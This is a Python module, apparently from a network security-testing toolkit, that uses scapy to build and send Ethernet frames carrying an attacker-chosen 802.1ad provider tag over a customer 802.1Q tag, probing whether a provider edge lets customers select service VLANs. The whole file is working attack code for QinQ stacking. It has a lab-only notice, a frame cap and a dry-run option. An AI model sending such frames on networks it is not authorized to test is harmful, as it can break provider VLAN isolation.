"""QinQ stacking abuse: sends a frame with a chosen provider (S-) tag outside the customer tag.

Provider edges use IEEE 802.1ad: the outer tag has TPID 0x88A8 and names a provider service,
and the inner tag is the customer's 802.1Q tag (TPID 0x8100). If the edge does not set the
outer tag itself, a customer who can send frames can choose the service a frame uses.

This module builds and sends such frames once. Whether the edge accepts the chosen service
depends on its configuration: the lab checks whether a provider-side port receives the frame
with the attacker's outer tag, when the customer port is allowed that service and when it is not.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Dot1Q, Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac

MAX_FRAMES = 100
TPID_PROVIDER = 0x88A8     # IEEE 802.1ad outer (S-) tag
TPID_CUSTOMER = 0x8100     # IEEE 802.1Q inner (C-) tag
EXPERIMENTAL_ETHERTYPE = 0x88B5
PAYLOAD = b"MACabre QinQ stacking probe"


@dataclass(frozen=True)
class QinQStackingConfig:
    iface: str                  # customer-side interface
    provider_vid: int           # outer (service) VLAN the frame asks for
    customer_vid: int           # inner (customer) VLAN
    source_mac: str             # the customer MAC on the frame
    frames: int = 1             # frames to send
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        for name, vid in (("Provider VLAN", self.provider_vid), ("Customer VLAN", self.customer_vid)):
            if not 1 <= vid <= 4094:
                raise ValueError(f"{name} must be between 1 and 4094.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class QinQStackingStats:
    frames: int = 0
    status: str = ""


def stacked_frame(source_mac: str, provider_vid: int, customer_vid: int) -> Packet:
    """Ethernet frame with an 802.1ad outer tag, an 802.1Q inner tag and an experimental payload."""
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=BROADCAST_MAC, type=TPID_PROVIDER)
        / Dot1Q(vlan=provider_vid, type=TPID_CUSTOMER)
        / Dot1Q(vlan=customer_vid, type=EXPERIMENTAL_ETHERTYPE)
        / Raw(PAYLOAD)
    )


def run_qinq_stacking(
    config: QinQStackingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[QinQStackingStats], None],
    send: Callable[..., Any] | None = None,
) -> QinQStackingStats:
    """Send the stacked frames once, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = QinQStackingStats(
            status=(
                f"Dry run: would send {config.frames} frame(s) with provider VLAN {config.provider_vid} "
                f"and customer VLAN {config.customer_vid} from this port. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = QinQStackingStats()
    if stop_event.is_set():
        return stats
    frame = stacked_frame(config.source_mac, config.provider_vid, config.customer_vid)
    send([frame] * config.frames, iface=config.iface, verbose=False)
    stats.frames = config.frames
    on_progress(replace(stats))
    return stats
